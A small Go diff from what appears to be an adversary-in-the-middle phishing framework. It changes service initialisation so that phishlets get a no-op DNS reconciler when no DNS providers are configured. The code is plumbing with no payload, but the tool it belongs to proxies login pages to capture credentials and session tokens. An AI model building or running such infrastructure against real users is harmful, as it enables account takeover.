@@ -226,7 +226,12 @@ func (ini *initializer) initServices() error {
 	ini.blacklistSvc = aitm.NewBlacklistService(ini.bus)
 	ini.spoofProxy = proxy.NewSpoofProxy(ini.cfg.SpoofURL, ini.logger)
 
-	phishletSvc := aitm.NewPhishletService(ini.phishletStore, ini.bus, ini.dnsService, ini.lureStore, ini.logger)
+	var phishletSvc *aitm.PhishletService
+	if len(ini.dnsProviders) == 0 {
+		phishletSvc = aitm.NewPhishletService(ini.phishletStore, ini.bus, aitm.NopDNSReconciler{}, ini.lureStore, ini.logger)
+	} else {
+		phishletSvc = aitm.NewPhishletService(ini.phishletStore, ini.bus, ini.dnsService, ini.lureStore, ini.logger)
+	}
 	ini.loadPhishlets(ini.cfg.PhishletsDir, phishletSvc)
 	if err := phishletSvc.LoadFromDB(); err != nil {
 		return fmt.Errorf("loading phishlets from db: %w", err)
